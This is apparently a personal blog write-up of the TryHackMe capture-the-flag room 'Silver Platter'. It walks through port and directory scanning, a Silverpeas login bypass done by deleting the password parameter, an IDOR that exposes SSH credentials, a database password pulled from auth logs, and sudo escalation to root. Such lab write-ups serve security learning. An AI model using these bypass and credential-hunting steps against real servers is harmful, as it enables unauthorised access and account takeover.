---
title: "Silver Platter"
date: 2025-03-15
image: /assets/img/tryhackme/SilverPlatter/SilverPlatter_image.jpg
description: Writeup of the TryHackMe-CTF Silver Platter
categories: [TryHackMe, Easy]
tags: [linux, blv]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Silver Platter</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Can you breach the server?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/silverplatter">https://tryhackme.com/room/silverplatter</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Silver Platter.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.254.4                                          
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 07:10 EDT
  Nmap scan report for 10.10.254.4
  Host is up (0.042s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  8080/tcp open  http-proxy

  Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,8080 10.10.254.4
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 07:10 EDT
  Nmap scan report for 10.10.254.4
  Host is up (0.039s latency).

  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
  |_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
  80/tcp   open  http       nginx 1.18.0 (Ubuntu)
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  |_http-title: Hack Smarter Security
  8080/tcp open  http-proxy
  |_http-title: Error
  | fingerprint-strings: 
  |   FourOhFourRequest, GetRequest, HTTPOptions: 
  |     HTTP/1.1 404 Not Found
  |     Connection: close
  |     Content-Length: 74
  |     Content-Type: text/html
  |     Date: Sun, 09 Mar 2025 11:10:45 GMT
  |     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
  |   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
  |     HTTP/1.1 400 Bad Request
  |     Content-Length: 0
  |_    Connection: close
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The webserver hosted a single-page application for the company "Hack Smarter Security". Directory enumeration didn't reveal anything of interest. 
```bash
$ gobuster dir --url http://10.10.254.4/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://10.10.254.4/images/]
/assets               (Status: 301) [Size: 178] [--> http://10.10.254.4/assets/]
```

I continued manually analyze the website and found an interesting hint in the contact field:
```text
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```

Upon further research, I discoverd that `Silverpeas` is an open-source collaborative intranet. I began searching for this application but didn't find anything on port 80.

## Port 8080 Analysis

I restarted the directory enumeration, but didn't discoverd something useful, including the `Silverpeas` application.
```bash
$ gobuster dir --url http://10.10.254.4:8080/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.4:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/website              (Status: 302) [Size: 0] [--> http://10.10.254.4:8080/website/]
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
```

I manually explored different directories in an attempt to discover `Silverpeas` and successfully located it at the following URL:
```text
http://10.10.254.4:8080/silverpeas
```

![Silverpeas login](/assets/img/tryhackme/SilverPlatter/thm_silverplatter_1.jpg)

At the bottom of the login page, I found a potential version number:
```text
 © 2001-2022 Silverpeas - All rights reserved
```

Using this version, I performed research to find any potential vulnerabilities and came across some relevant information in this <a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d">GitHub</a>. I was able to log in by modifying the POST request variables. The login was successful after removing the password field:
```html
Login=scr1ptkiddy&Password=test&DomainId=0
 <- changed to ->
Login=scr1ptkiddy&DomainId=0
```

![Silverpeas](/assets/img/tryhackme/SilverPlatter/thm_silverplatter_2.jpg)

While enumerating the application, I found an unread message:
```text
Tyler just asked if I wanted to play VR but he left you out scr1ptkiddy (what a jerk). Want to join us? We will probably hop on in like an hour or so. 
```

During my initial research, I also found an Insecure Direct Object Reference (IDOR) vulnerability on <a href="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323">GitHub</a>. Using this, I was able to read all messages which where exchanged on the server. One message in particular was really interesting -- it contained SSH credentials to log in as Tim and retrieve the user flag:

![Interesting Message](/assets/img/tryhackme/SilverPlatter/thm_silverplatter_3.jpg)

tim@silver-platter:~$ cat user.txt 
THM{[removed]}

## Privilege Escalation tyler

While searching for privilege escalation possibilities, I found credentials in the log files: 
```bash
tim@silver-platter:/$ cat /var/log/auth* | grep -i pass
[...]
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
[...]
```

Since the password was reused for both the Postgresql database and the user account, I was able to switch the user to Tyler:
```bash
tim@silver-platter:/$ su tyler
  Password:
tyler@silver-platter:/$ id
  uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

## Privilege Escalation root
I started by running `sudo -l` and got the following output, which allowed me to retrieved the root flag:
```bash
tyler@silver-platter:/$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL

tyler@silver-platter:/$ sudo cat /root/root.txt
	THM{[removed]}
```

solved! :)